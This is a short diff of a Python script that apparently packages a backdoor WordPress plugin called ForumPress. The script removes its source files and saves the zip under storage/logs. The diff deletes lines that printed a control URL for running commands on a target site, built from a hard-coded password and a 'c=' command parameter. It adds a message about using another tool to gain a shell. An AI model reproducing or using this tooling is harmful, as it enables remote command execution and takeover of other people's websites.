@@ -33,8 +33,6 @@ def main():
 	run("rm index.php forum_press.php && echo 'Files have been removed'")
 	run("mv ForumPress.zip storage/logs/ForumPress.zip && echo 'Moving compiled plugin into storage'")
 	text("Saved as: storage/logs/ForumPress.zip")
-	url = "Control: http://" + ask.target
-	target = url + "/wp-content/plugins/ForumPress/forum_press.php?passwd=qgAZ9xWxTsmGX5mgnbTHyzdf5oSbwzRhVB4LL7d29RSb4MqXRdbSWEoCvaTn&c=<command-here>"
-	text(target)
+	text("Done, use SinglePartner to gain a shell.")
 
 main()
